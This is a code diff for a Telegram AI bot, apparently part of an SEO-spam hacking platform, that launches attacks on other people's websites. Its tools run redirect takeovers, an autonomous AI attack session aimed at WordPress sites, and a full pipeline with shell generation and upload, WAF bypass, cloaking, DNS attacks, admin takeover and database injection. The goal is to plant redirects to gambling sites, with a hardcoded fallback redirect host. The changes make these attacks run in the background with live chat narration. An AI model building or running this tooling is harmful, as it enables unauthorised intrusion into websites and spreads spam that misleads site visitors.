@@ -1357,200 +1357,30 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         const method = args.method || "full_chain";
         const targetDomain = args.targetDomain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
         const methodEta = getMethodEta(method);
-        let result = "";
         
-        if (method === "scan_only") {
-          // Scan only — check vulnerabilities
-          const { analyzeDomain } = await import("./seo-engine");
-          const analysis = await analyzeDomain(targetDomain, "gambling");
-          const duration = Date.now() - startTime;
-          result = `🔍 สแกนเสร็จ: ${targetDomain}\n` +
-            `DA: ${analysis.currentState.estimatedDA}, DR: ${analysis.currentState.estimatedDR}\n` +
-            `Backlinks: ${analysis.currentState.estimatedBacklinks}\n` +
-            `Indexed: ${analysis.currentState.isIndexed ? "Yes" : "No"}\n` +
-            `⏱ สแกนใช้เวลา ${formatDuration(duration)}\n` +
-            `สถานะ: สแกนเสร็จ ยังไม่ได้โจมตี`;
-          await saveAttackLog({
-            targetDomain, method: "scan_only", success: true,
-            durationMs: duration,
-            aiReasoning: `Scan: DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} BL=${analysis.currentState.estimatedBacklinks}`,
-            preAnalysisData: analysis.currentState,
-          });
-        } else if (method === "redirect_only") {
-          // Redirect takeover only
-          const { executeRedirectTakeover } = await import("./redirect-takeover");
-          const { pickRedirectUrl } = await import("./agentic-attack-engine");
-          const redirectUrl = args.redirectUrl || await pickRedirectUrl();
-          
-          const results = await executeRedirectTakeover({
-            targetUrl: `https://${targetDomain}`,
-            ourRedirectUrl: redirectUrl,
-          });
-          
-          const succeeded = results.filter(r => r.success);
-          const duration = Date.now() - startTime;
-          
-          result = `🎯 Redirect Takeover: ${targetDomain}\n` +
-            `Redirect to: ${redirectUrl}\n` +
-            `วิธีที่ลอง: ${results.length}\n` +
-            `สำเร็จ: ${succeeded.length}\n`;
-          
-          if (succeeded.length > 0) {
-            result += `\nวิธีที่ได้ผล:\n${succeeded.map(r => `  ✅ ${r.method}: ${r.injectedUrl || "deployed"}`).join("\n")}\n` +
-              `\nสถานะ: ✅ สำเร็จ`;
-          } else {
-            const failedMethods = results.map(r => `${r.method}: ${r.detail || "failed"}`).join(", ");
-            result += `\nสถานะ: ❌ ล้มเหลว — ไม่สามารถวาง redirect ได้`;
-            result += `\n❌ รายละเอียด: ${failedMethods}`;
-          }
-          result += `\n⏱ ใช้เวลา ${formatDuration(duration)}`;
-          await saveAttackLog({
-            targetDomain, method: "redirect_only",
-            success: succeeded.length > 0,
-            durationMs: duration,
-            redirectUrl,
-            uploadedUrl: succeeded[0]?.injectedUrl,
-            errorMessage: succeeded.length === 0 ? `All ${results.length} redirect methods failed: ${results.map(r => `${r.method}:${r.detail || "fail"}`).join(", ")}` : undefined,
-            aiReasoning: succeeded.length > 0 ? `Succeeded: ${succeeded.map(r => r.method).join(", ")}` : `All ${results.length} methods failed`,
-          });
-        } else if (method === "agentic_auto") {
-          // AI auto attack
-          const { startAgenticSession, pickRedirectUrl } = await import("./agentic-attack-engine");
-          const redirectUrl = args.redirectUrl || await pickRedirectUrl();
-          const session = await startAgenticSession({
-            userId: 1,
-            redirectUrls: [redirectUrl],
-            maxTargetsPerRun: 10,
-            maxConcurrent: 3,
-            targetCms: ["wordpress"],
-            mode: "full_auto",
-            customDorks: [`site:${targetDomain}`],
-          });
-          const duration = Date.now() - startTime;
-          result = `🤖 Agentic Attack เริ่มแล้ว!\n` +
-            `Session ID: ${session.sessionId}\n` +
-            `เป้าหมาย: ${targetDomain}\n` +
-            `Redirect: ${redirectUrl}\n` +
-            `Mode: AI Auto — จะหาช่องโหว่และโจมตีอัตโนมัติ\n` +
-            `⏱ ETA: ${methodEta.label}\n` +
-            `สถานะ: 🔄 กำลังดำเนินการ (ทำงาน background)\n` +
-            `📡 ระบบจะ update สถานะทุก 30 วินาที และแจ้งเมื่อเสร็จ\n` +
-            `⏱ เริ่มต้นใช้เวลา ${formatDuration(duration)}`;
-          await saveAttackLog({
-            targetDomain, method: "agentic_auto", success: true,
-            durationMs: duration, redirectUrl,
-            sessionId: String(session.sessionId),
-            aiReasoning: `Agentic session #${session.sessionId} started`,
-          });
-        } else {
-          // Full chain attack — uses REAL unified attack pipeline (scan + exploit + upload + verify)
-          const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
-          const { pickRedirectUrl } = await import("./agentic-attack-engine");
-          const redirectUrl = args.redirectUrl || await pickRedirectUrl();
-          
-          // Collect progress events for summary
-          const progressEvents: string[] = [];
-          let lastPhase = "";
-          
-          const pipelineResult = await runUnifiedAttackPipeline(
-            {
-              targetUrl: `https://${targetDomain}`,
-              redirectUrl,
-              seoKeywords: ["casino", "gambling", "slots"],
-              enableCloaking: true,
-              enableWafBypass: true,
-              enableAltUpload: true,
-              enableIndirectAttacks: true,
-              enableDnsAttacks: true,
-              enableConfigExploit: true,
-              enableWpAdminTakeover: true,
-              enableWpDbInjection: true,
-              enableAiCommander: true,
-              enableComprehensiveAttacks: true,
-              enablePostUpload: true,
-              userId: 1,
-              globalTimeout: 10 * 60 * 1000, // 10 minutes for Telegram
-            },
-            (event) => {
-              // Track phase transitions for summary
-              if (event.phase !== lastPhase) {
-                lastPhase = event.phase;
-                progressEvents.push(`${event.phase}: ${event.detail.substring(0, 80)}`);
-              }
-            },
-          );
-          
-          const duration = Date.now() - startTime;
-          const verifiedFiles = pipelineResult.uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
-          const anyRedirectWorks = pipelineResult.uploadedFiles.some(f => f.redirectWorks);
-          const pipelineSuccess = pipelineResult.success || verifiedFiles.length > 0 || anyRedirectWorks;
-          
-          result = `⚔️ Unified Attack Pipeline: ${targetDomain}\n` +
-            `Redirect to: ${redirectUrl}\n` +
-            `Shells สร้าง: ${pipelineResult.shellsGenerated}\n` +
-            `Upload attempts: ${pipelineResult.uploadAttempts}\n` +
-            `ไฟล์ที่ upload ได้: ${pipelineResult.uploadedFiles.length}\n` +
-            `Redirect ทำงานจริง: ${verifiedFiles.length}\n\n`;
-          
-          // Show verified redirect files
-          if (verifiedFiles.length > 0) {
-            result += `✅ Redirect สำเร็จ:\n`;
-            for (const f of verifiedFiles) {
-              result += `  ${f.url} → ${f.finalDestination} (${f.method})\n`;
-            }
-            result += `\n`;
-          }
-          
-          // Show uploaded but unverified files
-          const unverified = pipelineResult.uploadedFiles.filter(f => !f.redirectWorks);
-          if (unverified.length > 0) {
-            result += `📁 Upload ได้แต่ redirect ยังไม่ทำงาน:\n`;
-            for (const f of unverified.slice(0, 5)) {
-              result += `  ${f.url} (${f.method}) — HTTP ${f.httpStatus}\n`;
-            }
-            result += `\n`;
-          }
-          
-          // Show shellless results
-          if (pipelineResult.shelllessResults && pipelineResult.shelllessResults.length > 0) {
-            const shelllessSuccess = pipelineResult.shelllessResults.filter(r => r.success);
-            if (shelllessSuccess.length > 0) {
-              result += `🔄 Shellless attacks สำเร็จ: ${shelllessSuccess.length}\n`;
-              for (const r of shelllessSuccess.slice(0, 3)) {
-                result += `  ${r.method}: ${r.detail?.substring(0, 60) || "success"}\n`;
-              }
-              result += `\n`;
-            }
-          }
-          
-          // Show AI decisions summary
-          if (pipelineResult.aiDecisions.length > 0) {
-            result += `🧠 AI Decisions: ${pipelineResult.aiDecisions.length}\n`;
-            for (const d of pipelineResult.aiDecisions.slice(0, 3)) {
-              result += `  ${d.substring(0, 80)}\n`;
-            }
-            result += `\n`;
-          }
-          
-          // Show errors summary
-          if (pipelineResult.errors.length > 0 && !pipelineSuccess) {
-            result += `❌ Errors: ${pipelineResult.errors.slice(0, 3).join(", ")}\n\n`;
-          }
-          
-          result += `สถานะ: ${pipelineSuccess ? "✅ สำเร็จ — redirect ทำงานจริง!" : "❌ ล้มเหลว — ไม่สามารถวาง redirect ได้"}\n` +
-            `⏱ โจมตีใช้เวลา ${formatDuration(duration)}`;
-          
-          await saveAttackLog({
-            targetDomain, method: "full_chain",
-            success: pipelineSuccess,
-            durationMs: duration, redirectUrl,
-            uploadedUrl: verifiedFiles[0]?.url || pipelineResult.uploadedFiles[0]?.url,
-            aiReasoning: `Pipeline: ${pipelineResult.shellsGenerated} shells, ${pipelineResult.uploadAttempts} attempts, ${pipelineResult.uploadedFiles.length} uploaded, ${verifiedFiles.length} verified. AI: ${pipelineResult.aiDecisions.slice(0, 2).join("; ")}`,
-            errorMessage: !pipelineSuccess ? `Pipeline failed: ${pipelineResult.errors.slice(0, 3).join(", ")}` : undefined,
-          });
+        // Fire-and-forget: launch narrated attack in background via executeAttackWithProgress
+        // This sends its own real-time narration messages to Telegram
+        const config = getTelegramConfig();
+        if (!config) {
+          return `❌ Telegram ยังไม่ได้ตั้งค่า`;
         }
         
-        return result;
+        // Get chatId from args (injected by processMessage) or use first allowed chat
+        const attackChatId = args._chatId || getAllowedChatIds()[0];
+        if (!attackChatId) {
+          return `❌ ไม่พบ chat ID สำหรับส่ง progress`;
+        }
+        
+        // Launch attack with real-time narration (non-blocking)
+        executeAttackWithProgress(config, attackChatId, targetDomain, method).catch(err => {
+          console.error(`[TelegramAI] Narrated attack error: ${err.message}`);
+        });
+        
+        // Return immediately — narration will be sent as separate messages
+        return `⚔️ เริ่มโจมตี ${targetDomain} ด้วย ${method} แล้ว!\n` +
+          `ETA: ${methodEta.label}\n` +
+          `📡 ระบบจะแสดงขั้นตอนแบบ real-time ใน chat นี้\n` +
+          `สถานะ: 🔄 กำลังเริ่มต้น...`;
       }
 
       case "attack_multiple_websites": {
@@ -1758,60 +1588,29 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
       case "deploy_advanced": {
         const domain = args.domain;
         const technique = args.technique || "all";
-        const keywords = args.keywords ? args.keywords.split(",").map((k: string) => k.trim()) : undefined;
-        const doorwayCount = args.doorway_count || 50;
-
-        // Get redirect URL
-        let redirectUrl = args.redirect_url;
-        if (!redirectUrl) {
-          try {
-            const { pickRedirectUrl } = await import("./agentic-attack-engine");
-            redirectUrl = await pickRedirectUrl();
-          } catch {
-            redirectUrl = "https://hkt956.org/";
-          }
+        const deployMethod = `deploy_advanced_${technique}`;
+        const methodEtaDeploy = getMethodEta(deployMethod);
+        
+        // Fire-and-forget: launch narrated attack in background
+        const configDeploy = getTelegramConfig();
+        if (!configDeploy) {
+          return `❌ Telegram ยังไม่ได้ตั้งค่า`;
         }
-
-        const { generateAndDeployAdvanced } = await import("./advanced-deploy-engine");
-        const { generation, deployment } = await generateAndDeployAdvanced(domain, redirectUrl, {
-          techniques: technique === "all" ? undefined : [technique],
-          keywords,
-          doorwayCount,
-          userId: 1,
+        
+        const deployChatId = args._chatId || getAllowedChatIds()[0];
+        if (!deployChatId) {
+          return `❌ ไม่พบ chat ID สำหรับส่ง progress`;
+        }
+        
+        // Launch narrated deploy attack in background
+        executeAttackWithProgress(configDeploy, deployChatId, domain, deployMethod).catch(err => {
+          console.error(`[TelegramAI] Narrated deploy error: ${err.message}`);
         });
-
-        const duration = Date.now() - startTime;
-        let result = `🚀 Advanced Deploy: ${domain}\n\n`;
-        result += `📦 Generated: ${generation.totalPayloads} payloads, ${generation.totalFiles} files\n`;
-        result += `📤 Deployed: ${deployment.deployedFiles}/${deployment.totalFiles} files\n`;
-        result += `✅ Verified: ${deployment.verifiedFiles} files\n`;
-        result += `🔧 Methods: ${deployment.methodsUsed.length > 0 ? deployment.methodsUsed.join(", ") : "None succeeded"}\n`;
-        result += `⏱ ${formatDuration(duration)}\n`;
-
-        if (deployment.deployedUrls.length > 0) {
-          result += `\n🔗 Deployed URLs:\n`;
-          for (const u of deployment.deployedUrls.slice(0, 10)) {
-            result += `  ${u.verified ? "✅" : "⚠️"} ${u.url} (${u.type})\n`;
-          }
-          if (deployment.deployedUrls.length > 10) {
-            result += `  ... +${deployment.deployedUrls.length - 10} more\n`;
-          }
-        }
-
-        // Save attack log
-        try {
-          await saveAttackLog({
-            targetDomain: domain,
-            method: `deploy_advanced_${technique}`,
-            success: deployment.deployedFiles > 0,
-            durationMs: duration,
-            redirectUrl,
-            uploadedUrl: deployment.deployedUrls[0]?.url,
-            aiReasoning: `Deploy: ${deployment.deployedFiles}/${deployment.totalFiles} files, ${deployment.verifiedFiles} verified. Methods: ${deployment.methodsUsed.join(", ") || "none"}`,
-          });
-        } catch (e) { /* ignore log errors */ }
-
-        return result;
+        
+        return `🚀 เริ่ม Advanced Deploy ${domain} (${technique}) แล้ว!\n` +
+          `ETA: ${methodEtaDeploy.label}\n` +
+          `📡 ระบบจะแสดงขั้นตอนแบบ real-time ใน chat นี้\n` +
+          `สถานะ: 🔄 กำลังเริ่มต้น...`;
       }
 
       case "retry_attack": {
@@ -2194,6 +1993,10 @@ export async function processMessage(chatId: number, userMessage: string): Promi
         }
         
         const args = JSON.parse(toolCall.function.arguments || "{}");
+        // Inject chatId for attack tools so they can launch narrated progress
+        if (toolCall.function.name === "attack_website" || toolCall.function.name === "deploy_advanced") {
+          args._chatId = chatId;
+        }
         console.log(`[TelegramAI] Tool: ${toolCall.function.name}(${JSON.stringify(args).substring(0, 100)})`);
         
         const startTime = Date.now();
